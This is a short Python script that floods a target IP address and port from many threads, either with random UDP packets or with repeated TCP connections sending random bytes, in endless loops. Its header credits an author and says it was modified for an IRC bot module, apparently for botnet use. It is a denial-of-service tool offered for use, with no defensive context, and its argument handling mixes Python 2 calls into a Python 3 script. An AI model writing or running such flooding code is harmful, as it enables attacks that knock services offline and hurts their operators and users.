#!/usr/bin/env python3
#Code by LeeOn123 - modified by independent for perl irc bot module
import random
import socket
import threading

import sys
ip = str(raw_input(sys.argv[1:]))
port = int(raw_input(sys.argv[2:]))
choice = str(raw_input(sys.argv[3:]))
times = int(raw_input(sys.argv[4:]))
threads = int(raw_input(sys.argv[5:]))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
		
				s.send(data)

			
		except:
		
			s.close()


for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()

